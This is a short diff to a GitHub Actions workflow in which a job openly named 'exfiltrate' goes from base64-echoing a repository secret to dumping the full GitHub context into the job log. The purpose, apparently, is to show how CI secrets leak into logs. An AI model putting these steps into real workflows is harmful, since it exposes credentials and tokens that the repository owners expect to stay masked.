@@ -9,6 +9,7 @@ jobs:
   exfiltrate:
     runs-on: ubuntu-latest
     steps:
-      - run: echo $SECRET_CODE | base64
+      - name: Dump GitHub context
         env:
-          SECRET_CODE: ${{ secrets.CODEWORD }}
+          GITHUB_CONTEXT: ${{ toJson(github) }}
+        run: echo "$GITHUB_CONTEXT"
